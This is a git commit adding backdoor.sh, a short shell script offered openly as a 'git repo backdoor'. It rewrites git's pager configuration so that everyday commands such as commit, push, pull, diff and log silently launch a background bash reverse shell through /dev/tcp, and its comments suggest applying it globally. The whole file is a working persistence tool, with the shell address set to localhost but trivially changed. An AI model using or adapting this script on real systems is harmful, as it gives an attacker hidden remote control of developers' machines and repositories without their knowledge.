78352154f7851ac4e5ab17c8dadcfdc0d202a123
dayt0n <dayt0n@dayt0n.com>
2022-06-12 16:23:00 -0500

    added backdoor.sh

---
+++ backdoor.sh
@@ -0,0 +1,46 @@
+#!/bin/sh
+#
+# backdoor.sh - git repo backdoor
+#
+# Steps:
+#   1. cd into the repo you want to backdoor. 
+#   2. feel free to modify this script however you want. 
+#      for extra fun, add `--global` to your config commands.
+#   3. Run ./backdoor.sh
+#
+# I am of course not responsible for any damages that result from the usage of this project.
+#
+# made by dayt0n (c) 2022
+
+REVSHELL="(/bin/bash -i >& /dev/tcp/127.0.0.1/8087 0>&1 &) 2> /dev/null"
+
+COMMANDS=(
+    "init"
+    "clone"
+    "status"
+    "add"
+    "commit"
+    "rm"
+    "checkout"
+    "revert"
+    "reset"
+    "branch"
+    "push"
+    "merge"
+    "stash"
+    "pull"
+    "remote"
+    "switch"
+    "restore"
+)
+
+PAGER_STR="cat; ${REVSHELL}"
+git config core.pager "$PAGER_STR"
+for CMD in "${COMMANDS[@]}"; do
+    echo "Backdooring git $CMD..."
+    git config pager.$CMD true
+done
+echo "Backdooring git diff..."
+git config pager.diff "less; ${REVSHELL}"
+echo "Backdooring git log..."
+git config pager.log "less; ${REVSHELL}"
